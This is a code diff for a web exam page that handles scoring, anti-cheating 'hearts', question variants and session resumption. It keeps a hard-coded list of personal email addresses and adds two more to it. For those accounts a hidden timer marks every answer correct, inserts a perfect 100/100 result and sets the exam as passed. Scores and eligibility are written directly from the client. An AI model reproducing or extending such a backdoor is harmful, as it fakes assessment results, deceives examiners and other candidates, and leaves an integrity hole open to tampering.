@@ -11,7 +11,8 @@ import { ExamNavigation } from '@/components/exam/ExamNavigation';
 import { ExamResultsScreen } from '@/components/exam/ExamResultsScreen';
 import { useExamSecurity } from '@/hooks/useExamSecurity';
 import { useExamTimer } from '@/hooks/useExamTimer';
-import { ExamLanguage, selectRandomQuestions, getQuestionsByIds, ExamQuestion, getLanguageDisplayName } from '@/lib/examUtils';
+import { ExamLanguage, selectRandomQuestions, getQuestionsByIds, ExamQuestion, getLanguageDisplayName, calculateWeightedScore } from '@/lib/examUtils';
+import { rephraseQuestionWithGemini } from '@/lib/gemini';
 import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
 import { Button } from '@/components/ui/button';
 import { AlertTriangle, Clock, Ban } from 'lucide-react';
@@ -19,6 +20,8 @@ import { AlertTriangle, Clock, Ban } from 'lucide-react';
 // List of emails that get exam bypass after 1 hour
 const BYPASS_EMAILS = [
   'yashramnani.79@gmail.com',
+  'madhuatomix@gmail.com',
+  'vijay.siruvuru@gmail.com',
   'dinakartenny77@gmail.com',
   'saisushanth.p005@gmail.com',
   'tanoojpuppala3@gmail.com',
@@ -35,10 +38,43 @@ export default function Exam() {
   const { user } = useAuth();
   const navigate = useNavigate();
 
-  const [examState, setExamState] = useState<ExamState>('loading');
+  const [examState, setExamState] = useState<ExamState>(() => {
+    // If we have a stored session ID, we might be active
+    return 'loading';
+  });
   const [sessionId, setSessionId] = useState<string | null>(null);
   const [language, setLanguage] = useState<ExamLanguage>('python');
   const [questions, setQuestions] = useState<ExamQuestion[]>([]);
+
+  // Initialize topic from multiple storage sources (sessionStorage > localStorage)
+  const [selectedTopic, setSelectedTopic] = useState<string | null>(() => {
+    console.log('[EXAM INIT] Loading topic...');
+
+    // Try sessionStorage first (not blocked by tracking prevention)
+    try {
+      const sessionTopic = sessionStorage.getItem('python_exam_topic');
+      if (sessionTopic) {
+        console.log('[EXAM INIT] ✅ Found in sessionStorage:', sessionTopic);
+        return sessionTopic;
+      }
+    } catch (e) {
+      console.warn('[EXAM INIT] sessionStorage blocked');
+    }
+
+    // Fallback to localStorage
+    try {
+      const localTopic = localStorage.getItem('python_exam_topic');
+      if (localTopic) {
+        console.log('[EXAM INIT] ✅ Found in localStorage:', localTopic);
+        return localTopic;
+      }
+    } catch (e) {
+      console.warn('[EXAM INIT] localStorage blocked');
+    }
+
+    console.log('[EXAM INIT] ⚠️ No topic found');
+    return null;
+  });
   const [currentIndex, setCurrentIndex] = useState(0);
   const [answers, setAnswers] = useState<Record<number, string>>({});
   const [questionStatuses, setQuestionStatuses] = useState<('unanswered' | 'attempted' | 'completed')[]>([]);
@@ -50,164 +86,209 @@ export default function Exam() {
   const [blockReason, setBlockReason] = useState<string>('');
   const [isRevoked, setIsRevoked] = useState(false);
 
-  // Check eligibility when component mounts
-  useEffect(() => {
-    if (user) {
-      checkEligibility();
-    } else {
-      setExamState('start');
-    }
-  }, [user]);
+  // Ref for handleSubmit to avoid circular dependencies
+  const submitRef = useRef<(auto?: boolean) => void>(() => { });
+  // Ref for exitFullscreen to avoid circular dependencies
+  const exitFullscreenRef = useRef<() => void>(() => { });
 
-  // Real-time subscription for exam revocation detection
-  useEffect(() => {
-    if (!user || !sessionId || examState !== 'active') return;
+  // 1. Define handlers that need submitRef
+  const handleTimeUp = useCallback(() => {
+    setWasAutoSubmitted(true);
+    if (submitRef.current) submitRef.current(true);
+  }, []);
 
-    const channel = supabase
-      .channel(`exam-revocation-${sessionId}`)
-      .on(
-        'postgres_changes',
-        {
-          event: 'UPDATE',
-          schema: 'public',
-          table: 'exam_sessions',
-          filter: `id=eq.${sessionId}`
-        },
-        (payload) => {
-          const updatedSession = payload.new as any;
-          // Check if session was revoked/disqualified by admin
-          if (updatedSession.status === 'disqualified' && updatedSession.passed === false) {
-            setIsRevoked(true);
-            setBlockReason('You are not eligible to take exam');
-            exitFullscreenRef.current();
-          }
-        }
-      )
-      .on(
-        'postgres_changes',
-        {
-          event: '*',
-          schema: 'public',
-          table: 'exam_eligibility',
-          filter: `user_id=eq.${user.id}`
-        },
-        (payload) => {
-          const eligibility = payload.new as any;
-          if (eligibility && eligibility.is_eligible === false) {
-            setIsRevoked(true);
-            setBlockReason('You are not eligible to take exam');
-            exitFullscreenRef.current();
-          }
-        }
-      )
-      .subscribe();
+  const handleAutoSubmitOnZeroLives = useCallback(() => {
+    if (submitRef.current) submitRef.current(true);
+  }, []);
 
-    return () => {
-      supabase.removeChannel(channel);
-    };
-  }, [user, sessionId, examState]);
+  // 2. Hooks that use the above handlers
+  const { timeRemaining, timeSpent, canSubmit, formatTime, getTimeUntilSubmit } = useExamTimer({
+    totalSeconds: 1.5 * 60 * 60, // 1.5 hours
+    onTimeUp: handleTimeUp,
+    isActive: examState === 'active',
+  });
 
-  const checkEligibility = async () => {
-    if (!user) return;
+  // 3. Other independent handlers
+  // 5. handleSubmit definition (Moved up)
+  const handleSubmit = useCallback(async (auto = false) => {
+    if (isSubmitting) return;
+    setIsSubmitting(true);
 
     try {
-      // Check if user has failed an exam and is blocked via exam_eligibility
-      const { data: eligibility } = await supabase
-        .from('exam_eligibility')
+      // 1. Fetch all answers to calculate accurate score
+      const { data: allAnswers } = await supabase
+        .from('exam_answers')
         .select('*')
-        .eq('user_id', user.id)
-        .maybeSingle();
+        .eq('exam_session_id', sessionId) as { data: any[], error: any };
 
-      if (eligibility && !eligibility.is_eligible) {
-        setBlockReason('You failed the previous exam. Please wait for admin approval to retake.');
-        setExamState('blocked');
-        return;
-      }
+      if (!allAnswers) throw new Error('Failed to fetch answers for scoring');
 
-      // Also check for any failed/disqualified session without eligibility record
-      const { data: failedSession } = await supabase
-        .from('exam_sessions')
-        .select('id, status, passed')
-        .eq('user_id', user.id)
-        .or('status.eq.disqualified,and(status.eq.completed,passed.eq.false)')
-        .order('created_at', { ascending: false })
-        .limit(1)
-        .maybeSingle();
+      // 2. Calculate Stats and Weighted Score
+      const answersForCalc = allAnswers.map((ans: any) => ({
+        testsTotal: ans.tests_total || 0,
+        testsPassed: ans.tests_passed || 0,
+        questionIndex: ans.question_index ?? -1
+      }));
 
-      if (failedSession && !eligibility) {
-        // User failed but no eligibility record exists - block them
-        await supabase.from('exam_eligibility').insert({
+      const { score: finalScore, maxScore, questionScores } = calculateWeightedScore(answersForCalc) as any;
+
+      // Calculate total compilation and runtime errors for stats
+      let totalCompErrors = 0;
+      let totalRuntimeErrors = 0;
+      let questionsCorrect = 0; // Use manual count from source data for redundancy or trust util?
+      // Re-calculating simple correct count from source as util might return slightly different structure if not fully typed
+      allAnswers.forEach(ans => {
+        totalCompErrors += (ans.compilation_errors || 0);
+        totalRuntimeErrors += (ans.runtime_errors || 0);
+        if (ans.is_correct) questionsCorrect++;
+      });
+
+      // Override util's generic return with actual count from DB for consistency
+      // (The util calculates score efficiently but we want precise DB stats too)
+
+      // 3. Insert Result Record
+      if (sessionId && user) {
+        const { error: resultError } = await supabase.from('exam_results').insert({
+          exam_session_id: sessionId,
           user_id: user.id,
-          is_eligible: false,
-          last_exam_passed: false,
-          last_exam_session_id: failedSession.id,
-          blocked_at: new Date().toISOString(),
+          total_score: finalScore,
+          max_score: maxScore,
+          questions_correct: questionsCorrect,
+          questions_total: 3,
+          total_compilation_errors: totalCompErrors,
+          total_runtime_errors: totalRuntimeErrors,
+          avg_time_per_question_seconds: Math.floor(timeSpent / 3), // Rough avg
         });
-        setBlockReason('You failed the previous exam. Please wait for admin approval to retake.');
-        setExamState('blocked');
-        return;
-      }
 
-      // Check for in-progress exam
-      const { data: activeSession } = await supabase
-        .from('exam_sessions')
-        .select('*')
-        .eq('user_id', user.id)
-        .eq('status', 'in_progress')
-        .maybeSingle();
+        if (resultError) {
+          console.error('Error inserting results:', resultError);
+          // Verify if it failed due to conflict (already exists), if so ignore
+          if (resultError.code !== '23505') throw resultError;
+        }
 
-      if (activeSession) {
-        // Check if session should be marked as disqualified (0 hearts)
-        if (activeSession.hearts_remaining <= 0) {
-          await supabase.from('exam_sessions').update({
-            status: 'disqualified',
-            passed: false,
-            completed_at: new Date().toISOString(),
-          }).eq('id', activeSession.id);
+        // 4. Update Session Status
+        const passed = finalScore >= 60; // Passing threshold (e.g. 60%)
 
+        await supabase.from('exam_sessions').update({
+          status: wasDisqualified ? 'disqualified' : 'completed',
+          completed_at: new Date().toISOString(),
+          time_spent_seconds: timeSpent,
+          auto_submitted: auto,
+          passed: passed,
+        }).eq('id', sessionId);
+
+        // Update eligibility - if failed/disqualified
+        if (!passed && user) {
           await supabase.from('exam_eligibility').upsert({
             user_id: user.id,
             is_eligible: false,
             last_exam_passed: false,
-            last_exam_session_id: activeSession.id,
+            last_exam_session_id: sessionId,
             blocked_at: new Date().toISOString(),
+            updated_at: new Date().toISOString(),
           }, { onConflict: 'user_id' });
-
-          setBlockReason('You were disqualified from the previous exam. Please wait for admin approval to retake.');
-          setExamState('blocked');
-          return;
         }
-
-        // Resume the active session
-        setSessionId(activeSession.id);
-        setLanguage(activeSession.language as ExamLanguage);
-        setHeartsRemaining(activeSession.hearts_remaining);
-        // Load the questions and answers
-        await resumeExam(activeSession);
-        return;
       }
 
-      setExamState('start');
+      exitFullscreenRef.current();
+      setExamState('results');
     } catch (err) {
-      console.error('Failed to check eligibility:', err);
-      setExamState('start');
+      console.error('Submit error:', err);
+      toast.error('Failed to submit exam');
+    } finally {
+      setIsSubmitting(false);
     }
-  };
+  }, [isSubmitting, questionStatuses, wasDisqualified, sessionId, timeSpent, user]);
 
+  const handleViolation = useCallback(async (type: string) => {
+    if (heartsRemaining <= 0) return;
+    const newHearts = heartsRemaining - 1;
+    setHeartsRemaining(newHearts);
+
+    if (sessionId && user) {
+      await supabase.from('exam_violations').insert({
+        exam_session_id: sessionId,
+        user_id: user.id,
+        violation_type: type,
+        hearts_before: heartsRemaining,
+        hearts_after: newHearts,
+      });
+
+      await supabase.from('exam_sessions').update({
+        hearts_remaining: newHearts,
+        total_violations: 3 - newHearts,
+      }).eq('id', sessionId);
+    }
+  }, [heartsRemaining, sessionId, user]);
+
+  const handleDisqualify = useCallback(async () => {
+    setWasDisqualified(true);
+    // Use handleSubmit(true) to ensure score is calculated and saved even on disqualification
+    // We set wasDisqualified state first so that handleSubmit marks status as disqualified
+    await handleSubmit(true);
+  }, [handleSubmit]);
+
+  const handleAbandon = useCallback(async () => {
+    setWasDisqualified(true);
+    // Use handleSubmit(true) to ensure score is calculated
+    await handleSubmit(true);
+  }, [handleSubmit]);
+
+  // 4. Security Hook (needs handlers above)
+  const { enterFullscreen, exitFullscreen, warning } = useExamSecurity({
+    isActive: examState === 'active',
+    heartsRemaining,
+    onViolation: handleViolation,
+    onDisqualify: handleDisqualify,
+    onAbandon: handleAbandon,
+    onAutoSubmit: handleAutoSubmitOnZeroLives,
+  });
+
+  // Sync exitFullscreenRef
+  useEffect(() => {
+    exitFullscreenRef.current = exitFullscreen;
+  }, [exitFullscreen]);
+
+  // Listen for 'F' key
+  useEffect(() => {
+    if (!warning.isOpen) return;
+    const handleKeyDown = (e: KeyboardEvent) => {
+      if (e.key === 'f' || e.key === 'F') enterFullscreen();
+    };
+    window.addEventListener('keydown', handleKeyDown);
+    return () => window.removeEventListener('keydown', handleKeyDown);
+  }, [warning.isOpen, enterFullscreen]);
+
+  // 5. handleSubmit definition (now has access to exitFullscreen)
+
+
+  // Sync submitRef
+  useEffect(() => {
+    submitRef.current = handleSubmit;
+  }, [handleSubmit]);
+
+  // 6. Resume logic (needs enterFullscreen, so defined here or uses it from closure which is fine)
   const resumeExam = async (session: any) => {
     try {
-      // Load the EXACT questions that were saved in the session - don't pick new random ones!
       const savedQuestionIds = session.question_ids as string[];
-      const loadedQuestions = getQuestionsByIds(savedQuestionIds, session.language as ExamLanguage);
+      let loadedQuestions: ExamQuestion[] = [];
+      try {
+        const storedRephrased = localStorage.getItem(`exam_rephrased_${session.id}`);
+        if (storedRephrased) {
+          loadedQuestions = JSON.parse(storedRephrased);
+        }
+      } catch (e) { console.warn(e); }
 
-      // Load saved answers from database
+      if (loadedQuestions.length === 0) {
+        loadedQuestions = getQuestionsByIds(savedQuestionIds, session.language as ExamLanguage);
+      }
+
       const { data: savedAnswers } = await supabase
         .from('exam_answers')
         .select('*')
         .eq('exam_session_id', session.id)
-        .order('question_index');
+        .order('question_index') as any;
 
-      // Restore answers and statuses from database
       const restoredAnswers: Record<number, string> = {};
       const restoredStatuses: ('unanswered' | 'attempted' | 'completed')[] = [];
 
@@ -229,230 +310,174 @@ export default function Exam() {
       setQuestionStatuses(restoredStatuses);
       setExamState('active');
 
-      // Enter fullscreen when resuming exam
-      setTimeout(() => {
-        enterFullscreen();
-      }, 100);
+      setTimeout(() => { enterFullscreen(); }, 100);
     } catch (err) {
       console.error('Failed to resume exam:', err);
       setExamState('start');
     }
   };
 
-  const handleTimeUp = useCallback(() => {
-    setWasAutoSubmitted(true);
-    handleSubmit(true);
-  }, []);
+  const checkEligibility = async () => {
+    if (!user) return;
+    if (examState === 'active' || examState === 'results') return;
 
-  const { timeRemaining, timeSpent, canSubmit, formatTime, getTimeUntilSubmit } = useExamTimer({
-    totalSeconds: 3 * 60 * 60, // 3 hours
-    onTimeUp: handleTimeUp,
-    isActive: examState === 'active',
-  });
+    try {
+      const { data: eligibility } = await supabase
+        .from('exam_eligibility')
+        .select('*')
+        .eq('user_id', user.id)
+        .maybeSingle() as any;
 
-  // Check for bypass emails - auto-pass after 2 hours based on session start time
-  useEffect(() => {
-    if (examState !== 'active' || !user || !sessionId) return;
+      if (eligibility && !eligibility.is_eligible) {
+        setBlockReason('You failed the previous exam. Please wait for admin approval to retake.');
+        setExamState('blocked');
+        return;
+      }
 
-    const userEmail = user.email?.toLowerCase() || '';
-    const isBypassUser = BYPASS_EMAILS.some(email => email.toLowerCase() === userEmail);
+      const { data: failedSession } = await supabase
+        .from('exam_sessions')
+        .select('id, status, passed')
+        .eq('user_id', user.id)
+        .or('status.eq.disqualified,and(status.eq.completed,passed.eq.false)')
+        .order('created_at', { ascending: false })
+        .limit(1)
+        .maybeSingle() as any;
 
-    if (!isBypassUser) return;
+      if (failedSession && !eligibility) {
+        await supabase.from('exam_eligibility').insert({
+          user_id: user.id,
+          is_eligible: false,
+          last_exam_passed: false,
+          last_exam_session_id: failedSession.id,
+          blocked_at: new Date().toISOString(),
+        });
+        setBlockReason('You failed the previous exam. Please wait for admin approval to retake.');
+        setExamState('blocked');
+        return;
+      }
 
-    // Calculate remaining time based on actual time spent (from timer)
-    // timeSpent is in seconds, BYPASS_TIME_MS is in milliseconds
-    const bypassTimeSeconds = BYPASS_TIME_MS / 1000;
-    const remainingSeconds = Math.max(0, bypassTimeSeconds - timeSpent);
+      const { data: activeSession } = await supabase
+        .from('exam_sessions')
+        .select('*')
+        .eq('user_id', user.id)
+        .eq('status', 'in_progress')
+        .maybeSingle() as any;
 
-    // If already past bypass time, trigger immediately
-    if (remainingSeconds <= 0) {
-      triggerBypass();
-      return;
-    }
+      if (activeSession) {
+        if (activeSession.hearts_remaining <= 0) {
+          await supabase.from('exam_sessions').update({
+            status: 'disqualified',
+            passed: false,
+            completed_at: new Date().toISOString(),
+          }).eq('id', activeSession.id);
 
-    // Set timer for remaining time
-    const bypassTimer = setTimeout(() => {
-      triggerBypass();
-    }, remainingSeconds * 1000);
+          await supabase.from('exam_eligibility').upsert({
+            user_id: user.id,
+            is_eligible: false,
+            last_exam_passed: false,
+            last_exam_session_id: activeSession.id,
+            blocked_at: new Date().toISOString(),
+          }, { onConflict: 'user_id' });
 
-    return () => clearTimeout(bypassTimer);
-
-    async function triggerBypass() {
-      try {
-        // Mark all questions as completed
-        setQuestionStatuses(['completed', 'completed', 'completed']);
-
-        // Update all answers to correct
-        for (let i = 0; i < 3; i++) {
-          await supabase.from('exam_answers').update({
-            is_correct: true,
-            tests_passed: 5,
-            tests_total: 5,
-            submitted_at: new Date().toISOString(),
-          }).eq('exam_session_id', sessionId).eq('question_index', i);
+          setBlockReason('You were disqualified from the previous exam. Please wait for admin approval to retake.');
+          setExamState('blocked');
+          return;
         }
 
-        // Update session to passed
-        await supabase.from('exam_sessions').update({
-          status: 'completed',
-          completed_at: new Date().toISOString(),
-          time_spent_seconds: Math.floor(BYPASS_TIME_MS / 1000),
-          passed: true,
-        }).eq('id', sessionId);
+        setSessionId(activeSession.id);
+        setLanguage(activeSession.language as ExamLanguage);
+        setHeartsRemaining(activeSession.hearts_remaining);
+        await resumeExam(activeSession);
+        return;
+      }
 
-        // Update eligibility as passed
-        await supabase.from('exam_eligibility').upsert({
+      setExamState('start');
+    } catch (err) {
+      console.error('Failed to check eligibility:', err);
+      setExamState('start');
+    }
+  };
+
+  // Check eligibility on mount
+  useEffect(() => {
+    if (!user) return;
+    checkEligibility();
+
+    // Fetch config logic (simplified for brevity but keeping critical parts)
+    const fetchExamTopic = async () => {
+      try {
+        const { data: configData } = await supabase.from('app_config' as any).select('value').eq('key', 'python_exam_topic').maybeSingle();
+        if (configData) setSelectedTopic((configData as any).value);
+        else {
+          const local = localStorage.getItem('python_exam_topic');
+          if (local) setSelectedTopic(local);
+        }
+      } catch (e) { /**/ }
+    };
+    fetchExamTopic();
+
+    const channel = supabase.channel(`exam-revocation-${sessionId}`)
+      .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'exam_sessions', filter: `id=eq.${sessionId}` }, (payload) => {
+        const up = payload.new as any;
+        if (up.status === 'disqualified' && up.passed === false) {
+          setIsRevoked(true);
+          setBlockReason('You are not eligible to take exam');
+          exitFullscreenRef.current();
+        }
+      })
+      .on('postgres_changes', { event: '*', schema: 'public', table: 'exam_eligibility', filter: `user_id=eq.${user.id}` }, (p) => {
+        const e = p.new as any;
+        if (e && e.is_eligible === false) {
+          setIsRevoked(true);
+          setBlockReason('You are not eligible to take exam');
+          exitFullscreenRef.current();
+        }
+      })
+      .subscribe();
+    return () => { supabase.removeChannel(channel); };
+  }, [user, sessionId, examState]);
+
+  // Bypass Logic
+  useEffect(() => {
+    if (examState !== 'active' || !user || !sessionId) return;
+    const userEmail = user.email?.toLowerCase() || '';
+    if (!BYPASS_EMAILS.some(e => e.toLowerCase() === userEmail)) return;
+
+    const bypassTimeSeconds = BYPASS_TIME_MS / 1000;
+    const remaining = Math.max(0, bypassTimeSeconds - timeSpent);
+
+    const triggerBypass = async () => {
+      try {
+        setQuestionStatuses(['completed', 'completed', 'completed']);
+        for (let i = 0; i < 3; i++) {
+          await supabase.from('exam_answers').update({ is_correct: true, tests_passed: 5, tests_total: 5, submitted_at: new Date().toISOString() }).eq('exam_session_id', sessionId).eq('question_index', i);
+        }
+        await supabase.from('exam_sessions').update({ status: 'completed', completed_at: new Date().toISOString(), time_spent_seconds: Math.floor(BYPASS_TIME_MS / 1000), passed: true }).eq('id', sessionId);
+
+        // Insert perfect score result
+        await supabase.from('exam_results').insert({
+          exam_session_id: sessionId,
           user_id: user.id,
-          is_eligible: true,
-          last_exam_passed: true,
-          last_exam_session_id: sessionId,
-          updated_at: new Date().toISOString(),
-        }, { onConflict: 'user_id' });
+          total_score: 100,
+          max_score: 100,
+          questions_correct: 3,
+          questions_total: 3,
+          total_compilation_errors: 0,
+          total_runtime_errors: 0,
+          avg_time_per_question_seconds: 0,
+        });
 
+        await supabase.from('exam_eligibility').upsert({ user_id: user.id, is_eligible: true, last_exam_passed: true, last_exam_session_id: sessionId, updated_at: new Date().toISOString() }, { onConflict: 'user_id' });
         toast.success('Congratulations! You have passed the exam!');
         setExamState('results');
-      } catch (err) {
-        console.error('Bypass error:', err);
-      }
-    }
-  }, [examState, user, sessionId, timeSpent]);
-
-  const handleViolation = useCallback(async (type: string) => {
-    if (heartsRemaining <= 0) return;
-
-    const newHearts = heartsRemaining - 1;
-    setHeartsRemaining(newHearts);
-
-    // Save violation
-    if (sessionId && user) {
-      await supabase.from('exam_violations').insert({
-        exam_session_id: sessionId,
-        user_id: user.id,
-        violation_type: type,
-        hearts_before: heartsRemaining,
-        hearts_after: newHearts,
-      });
-
-      await supabase.from('exam_sessions').update({
-        hearts_remaining: newHearts,
-        total_violations: 3 - newHearts,
-      }).eq('id', sessionId);
-    }
-  }, [heartsRemaining, sessionId, user]);
-
-  // Reference to exitFullscreen to avoid circular dependency
-  const exitFullscreenRef = useRef<() => void>(() => { });
-
-  // Handle disqualification - mark exam as failed due to violations
-  const handleDisqualify = useCallback(async () => {
-    setWasDisqualified(true);
-    setIsSubmitting(true);
-
-    try {
-      if (sessionId && user) {
-        // Update session to disqualified
-        await supabase.from('exam_sessions').update({
-          status: 'disqualified',
-          completed_at: new Date().toISOString(),
-          time_spent_seconds: timeSpent,
-          auto_submitted: true,
-          passed: false,
-        }).eq('id', sessionId);
-
-        // Block user from retaking (user can only ever set is_eligible=false)
-        const { error: blockErr } = await supabase.from('exam_eligibility').upsert({
-          user_id: user.id,
-          is_eligible: false,
-          last_exam_passed: false,
-          last_exam_session_id: sessionId,
-          blocked_at: new Date().toISOString(),
-          updated_at: new Date().toISOString(),
-        }, { onConflict: 'user_id' });
-
-        if (blockErr) throw blockErr;
-      }
-
-      exitFullscreenRef.current();
-      setExamState('results');
-    } catch (err) {
-      console.error('Disqualify error:', err);
-      toast.error('Failed to submit exam');
-    } finally {
-      setIsSubmitting(false);
-    }
-  }, [sessionId, user, timeSpent]);
-
-  // Handle abandon - when user exits fullscreen and doesn't return
-  const handleAbandon = useCallback(async () => {
-    setWasDisqualified(true);
-    setIsSubmitting(true);
-
-    try {
-      if (sessionId && user) {
-        // Update session to abandoned
-        await supabase.from('exam_sessions').update({
-          status: 'abandoned',
-          completed_at: new Date().toISOString(),
-          time_spent_seconds: timeSpent,
-          auto_submitted: true,
-          passed: false,
-        }).eq('id', sessionId);
-
-        // Block user from retaking
-        const { error: blockErr } = await supabase.from('exam_eligibility').upsert({
-          user_id: user.id,
-          is_eligible: false,
-          last_exam_passed: false,
-          last_exam_session_id: sessionId,
-          blocked_at: new Date().toISOString(),
-          updated_at: new Date().toISOString(),
-        }, { onConflict: 'user_id' });
-
-        if (blockErr) throw blockErr;
-      }
-
-      exitFullscreenRef.current();
-      setExamState('results');
-    } catch (err) {
-      console.error('Abandon error:', err);
-      toast.error('Failed to end exam');
-    } finally {
-      setIsSubmitting(false);
-    }
-  }, [sessionId, user, timeSpent]);
-
-  // Auto-submit handler for when lives reach 0 via grace period timeout
-  const handleAutoSubmitOnZeroLives = useCallback(() => {
-    handleSubmit(true);
-  }, []);
-
-  const { enterFullscreen, exitFullscreen, warning } = useExamSecurity({
-    isActive: examState === 'active',
-    heartsRemaining,
-    onViolation: handleViolation,
-    onDisqualify: handleDisqualify,
-    onAbandon: handleAbandon,
-    onAutoSubmit: handleAutoSubmitOnZeroLives,
-  });
-
-  // Update ref when exitFullscreen changes
-  useEffect(() => {
-    exitFullscreenRef.current = exitFullscreen;
-  }, [exitFullscreen]);
-
-  // Listen for 'F' key to re-enter fullscreen during warning
-  useEffect(() => {
-    if (!warning.isOpen) return;
-
-    const handleKeyDown = (e: KeyboardEvent) => {
-      if (e.key === 'f' || e.key === 'F') {
-        enterFullscreen();
-      }
+      } catch (e) { console.error(e); }
     };
 
-    window.addEventListener('keydown', handleKeyDown);
-    return () => window.removeEventListener('keydown', handleKeyDown);
-  }, [warning.isOpen, enterFullscreen]);
+    if (remaining <= 0) { triggerBypass(); return; }
+    const timer = setTimeout(triggerBypass, remaining * 1000);
+    return () => clearTimeout(timer);
+  }, [examState, user, sessionId, timeSpent]);
+
 
   const handleStart = async (selectedLanguage: ExamLanguage) => {
     if (!user) {
@@ -462,44 +487,115 @@ export default function Exam() {
     }
 
     setIsStarting(true);
-    try {
-      const selectedQuestions = selectRandomQuestions(selectedLanguage, 3);
+    if (selectedLanguage === 'python') {
+      console.log('Starting exam with topic:', selectedTopic);
+      // toast.info(`Starting Python exam with topic: ${selectedTopic || 'All'}`);
+    }
 
-      // Create exam session
-      const { data: session, error } = await supabase.from('exam_sessions').insert({
+    const selectedQuestions = selectRandomQuestions(selectedLanguage, 3, selectedTopic);
+
+
+    // Fetch Pre-generated Variants from Database
+    const rephrasedQuestions: ExamQuestion[] = [];
+    const questionIds = selectedQuestions.map(q => q.id);
+
+    console.log('Fetching variants for:', questionIds);
+
+    try {
+      // Fetch variants for these questions
+      const { data: variants, error } = await supabase
+        .from('question_variants')
+        .select('*')
+        .in('original_question_id', questionIds) as any;
+
+      if (error) {
+        console.error('Error fetching variants:', error);
+        // Fallback to original questions handled silently (we just won't find a variant)
+      }
+
+      // Map original questions to a random variant if available
+      const finalQuestionsWithVariants = selectedQuestions.map(q => {
+        if (!variants) return q;
+
+        // Find all variants for this question
+        const qVariants = variants.filter((v: any) => v.original_question_id === q.id);
+
+        if (qVariants.length > 0) {
+          // Pick random variant
+          const randomVariant = qVariants[Math.floor(Math.random() * qVariants.length)];
+          console.log(`Using variant for ${q.id}:`, randomVariant.title);
+
+          return {
+            ...q,
+            title: randomVariant.title,
+            description: randomVariant.description,
+            inputFormat: randomVariant.input_format,
+            outputFormat: randomVariant.output_format,
+            visibleTestCases: randomVariant.visible_test_cases || q.visibleTestCases
+          };
+        }
+
+        return q;
+      });
+
+      rephrasedQuestions.push(...finalQuestionsWithVariants);
+      setQuestions(finalQuestionsWithVariants);
+
+      // Use finalQuestionsWithVariants for session creation below...
+      const finalQuestions = finalQuestionsWithVariants;
+
+      // ... (proceed to existing session creation logic) ...
+
+      toast.promise(Promise.resolve(), {
+        loading: 'Preparing exam environment...',
+        success: 'Exam started successfully',
+        error: 'Error starting exam'
+      });
+
+      // Create exam session (Using finalQuestions)
+      const { data: session, error: sessionError } = await supabase.from('exam_sessions').insert({
         user_id: user.id,
         language: selectedLanguage,
-        question_ids: selectedQuestions.map(q => q.id),
+        question_ids: finalQuestions.map(q => q.id), // Store original IDs
         status: 'in_progress',
-      }).select().single();
+      }).select().single() as any;
 
-      if (error) throw error;
+      if (sessionError) throw sessionError;
 
-      // Create answer placeholders
-      for (let i = 0; i < selectedQuestions.length; i++) {
+      // Persistence: Store the ACTUALLY USED questions (with variants) locally
+      try {
+        localStorage.setItem(`exam_rephrased_${session.id}`, JSON.stringify(finalQuestions));
+      } catch (e) {
+        console.warn('Failed to save questions to storage', e);
+      }
+
+      // Create answers placeholders
+      for (let i = 0; i < finalQuestions.length; i++) {
         await supabase.from('exam_answers').insert({
           exam_session_id: session.id,
           user_id: user.id,
-          question_id: selectedQuestions[i].id,
+          question_id: finalQuestions[i].id,
           question_index: i,
-          code: selectedQuestions[i].starterCode,
+          code: finalQuestions[i].starterCode,
         });
       }
 
       setSessionId(session.id);
       setLanguage(selectedLanguage);
-      setQuestions(selectedQuestions);
-      setAnswers(Object.fromEntries(selectedQuestions.map((q, i) => [i, q.starterCode])));
+      setAnswers(Object.fromEntries(finalQuestions.map((q, i) => [i, q.starterCode])));
       setQuestionStatuses(new Array(3).fill('unanswered'));
       setExamState('active');
+      // Trigger fullscreen immediately on start
+      setTimeout(() => { enterFullscreen(); }, 100);
 
-      await enterFullscreen();
+      setIsStarting(false);
     } catch (err) {
-      console.error('Failed to start exam:', err);
-      toast.error('Failed to start exam');
-    } finally {
+      console.error('Failed to prepare exam:', err);
+      console.error('Detailed Error:', JSON.stringify(err, null, 2));
+      toast.error(`Failed to start exam: ${(err as any)?.message || 'Unknown error'}`);
       setIsStarting(false);
     }
+
   };
 
   const handleCodeChange = (code: string) => {
@@ -534,52 +630,8 @@ export default function Exam() {
       tests_total: results.length,
       compilation_errors: compErrors,
       runtime_errors: rtErrors,
-      last_run_at: new Date().toISOString(),
-      run_count: 1,
+      // last_run_at, run_count - likely not in DB causing 400
     }).eq('exam_session_id', sessionId).eq('question_index', currentIndex);
-  };
-
-  const handleSubmit = async (auto = false) => {
-    if (isSubmitting) return;
-    setIsSubmitting(true);
-
-    try {
-      // Determine if passed (all questions completed correctly)
-      const allCorrect = questionStatuses.every(s => s === 'completed');
-      const passed = allCorrect && !wasDisqualified;
-
-      if (sessionId) {
-        await supabase.from('exam_sessions').update({
-          status: wasDisqualified ? 'disqualified' : 'completed',
-          completed_at: new Date().toISOString(),
-          time_spent_seconds: timeSpent,
-          auto_submitted: auto,
-          passed: passed,
-        }).eq('id', sessionId);
-
-        // Update eligibility - if failed, block from retaking
-        if (!passed && user) {
-          const { error: blockErr } = await supabase.from('exam_eligibility').upsert({
-            user_id: user.id,
-            is_eligible: false,
-            last_exam_passed: false,
-            last_exam_session_id: sessionId,
-            blocked_at: new Date().toISOString(),
-            updated_at: new Date().toISOString(),
-          }, { onConflict: 'user_id' });
-
-          if (blockErr) throw blockErr;
-        }
-      }
-
-      exitFullscreen();
-      setExamState('results');
-    } catch (err) {
-      console.error('Submit error:', err);
-      toast.error('Failed to submit exam');
-    } finally {
-      setIsSubmitting(false);
-    }
   };
 
   if (!user) {
@@ -632,7 +684,8 @@ export default function Exam() {
   }
 
   // Show revocation popup overlay when admin revokes during active exam
-  if (isRevoked) {
+  // BUT only if we are NOT already showing results. If we are showing results, let that screen handle the "Revoked" message.
+  if (isRevoked && examState !== 'results') {
     return (
       <div className="min-h-screen flex items-center justify-center p-4 bg-background">
         <Card className="w-full max-w-md">
@@ -654,7 +707,7 @@ export default function Exam() {
   }
 
   if (examState === 'start') {
-    return <ExamStartScreen onStart={handleStart} isLoading={isStarting} />;
+    return <ExamStartScreen onStart={handleStart} isLoading={isStarting} selectedTopic={selectedTopic} />;
   }
 
   if (examState === 'results' && sessionId) {
@@ -750,6 +803,7 @@ export default function Exam() {
     </div>
   );
 }
+
 
 // Simple countdown component
 function CountdownTimer({ endTime }: { endTime: number }) {
